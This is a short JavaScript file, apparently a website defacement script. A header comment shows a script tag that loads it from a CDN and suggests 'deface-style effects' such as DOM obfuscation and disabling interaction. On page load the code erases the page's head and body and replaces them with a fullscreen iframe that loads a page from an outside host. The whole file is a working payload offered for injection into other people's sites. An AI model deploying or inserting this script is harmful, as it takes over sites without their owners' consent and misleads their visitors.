/*
  <script src="https://cdn.jsdelivr.net/gh/FrostFoe/root/html-js/palestine.js"></script>
    
     * This script injects a fullscreen iframe with your content.
     * You can modify it for more advanced deface-style effects.
     * Recommended customization:
     *   - Sound effects or background audio
     *   - Cursor effects or disabling interaction
     *   - Scrolling text banners
     *   - DOM obfuscation
     * 
     * Security Note:
     * Ensure the JS does not expose sensitive data or break accessibility permanently.
     
*/

document.addEventListener("DOMContentLoaded", () => {
  document.head.innerHTML = "";
  document.body.innerHTML = "";
  const html = document.documentElement;
  html.style.margin = "0";
  html.style.padding = "0";
  const body = document.body;
  body.style.margin = "0";
  body.style.padding = "0";
  body.style.overflow = "hidden";
  const iframe = document.createElement("iframe");
  iframe.src = "https://frostfoe.github.io/root/html-js/palestine.html";
  Object.assign(iframe.style, {
    width: "100vw",
    height: "100vh",
    position: "fixed",
    top: "0",
    left: "0",
    border: "none",
    padding: "0",
    margin: "0",
    overflow: "hidden",
    zIndex: "9999",
  });
  iframe.allow = "fullscreen";
  body.appendChild(iframe);
});
